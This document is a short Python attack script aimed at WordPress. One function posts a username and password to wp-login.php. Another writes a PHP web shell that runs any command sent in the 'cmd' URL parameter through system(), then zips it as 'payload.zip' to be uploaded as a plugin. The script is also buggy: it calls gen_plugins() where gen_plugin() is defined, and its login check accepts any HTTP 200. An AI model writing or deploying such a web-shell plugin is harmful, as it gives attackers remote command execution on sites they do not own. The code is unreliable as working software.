import requests
import zipfile


def login(user, password, url):
    urll = f'{url}wp-login.php'
    data = {
        'log': user,
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': f'{url}/wp-admin/index.php',
        'testcookie': '1'
    }  
    r = requests.post(urll, data,  allow_redirects=True)
    if r.status_code == 200:  
        return True
    else: 
        return False


def gen_plugin(): 
    php_code = """<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>"""
    with open("plugins.php", "w") as php_file:
        php_file.write(php_code)
        print('[*] genereta plugins...')
    zip = 'payload.zip'

    with zipfile.ZipFile(zip, 'w') as zip_file:
        zip_file.write("plugins.php")
        print('[+] plugins was generate.')
    
    return(f'[+] payload name: {zip}')

print(gen_plugins())


#user = input('enter wp user: ')
#password = input('enter wp pass: ')
#url = input('enter wp url: ')
#login_wp = login(user, password, url) 
#print(login_wp)

